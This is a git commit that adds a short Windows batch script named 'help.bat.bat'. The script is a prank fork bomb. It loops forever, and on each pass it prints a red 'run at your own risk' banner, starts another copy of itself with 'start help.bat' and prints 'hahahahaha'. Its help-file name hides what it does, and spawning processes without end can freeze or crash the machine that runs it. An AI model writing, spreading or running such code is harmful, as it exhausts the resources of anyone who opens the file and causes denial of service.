9bcbd9dd6d9575446608f601a46c48fe5fb215ef
RustyWarShips <51161212+RustyWarShips@users.noreply.github.com>
2019-05-29 12:56:52 +0100

    Add files via upload

---
+++ help.bat.bat
@@ -0,0 +1,16 @@
+@echo off
+:s
+color 04
+echo =====================================================
+color 40
+echo :WARNING:YOU HAVE RAN THIS PROGRAM AT YOUR OWN RISK!
+color 04
+echo =====================================================
+color 40
+start help.bat
+
+wait 
+echo hahahahaha
+
+goto s
+start help.bat
